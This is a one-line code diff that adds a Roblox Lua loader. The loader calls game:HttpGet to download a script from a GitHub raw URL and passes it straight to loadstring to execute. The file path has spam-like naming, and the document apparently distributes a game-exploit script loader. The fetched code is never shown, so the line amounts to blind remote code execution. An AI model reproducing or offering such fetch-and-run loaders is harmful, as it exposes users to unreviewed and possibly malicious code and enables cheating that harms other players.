@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/races-wheelie-a-kukirin-escooter-simulat-spam3-qy7deg72oe6gte.lua"))()
